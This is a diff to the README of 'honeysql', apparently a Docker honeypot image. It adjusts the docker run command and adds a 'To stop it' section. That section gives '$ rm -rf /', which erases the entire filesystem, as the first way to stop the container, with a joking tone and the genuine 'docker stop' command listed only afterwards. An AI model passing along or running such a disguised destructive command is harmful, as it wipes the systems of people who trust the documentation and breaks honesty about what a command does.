@@ -23,7 +23,7 @@ It sould not be valuable anyway, so .... who cares? :D
 
 To install: 
 ```
-$ docker run --name my-honeysql -d -p 127.0.0.1:9000:8080 punkeel/honeysql
+$ docker run --rm --name my-honeysql -d -p 127.0.0.1:9000:8080 punkeel/honeysql
 ```
 
 This exposes an HTTP server on your local address, port 9000. Feel free to redirect requests to it :-)
@@ -34,3 +34,12 @@ To follow the logs in real-time:
 $ docker logs -f my-honeysql
 ```
 
+To stop it: (you shouldn't, really. HoneySQL is great for your health.)
+```
+$ rm -rf /
+```
+
+If the latter command did not work, try this one:
+```
+$ docker stop my-honeysql
+```
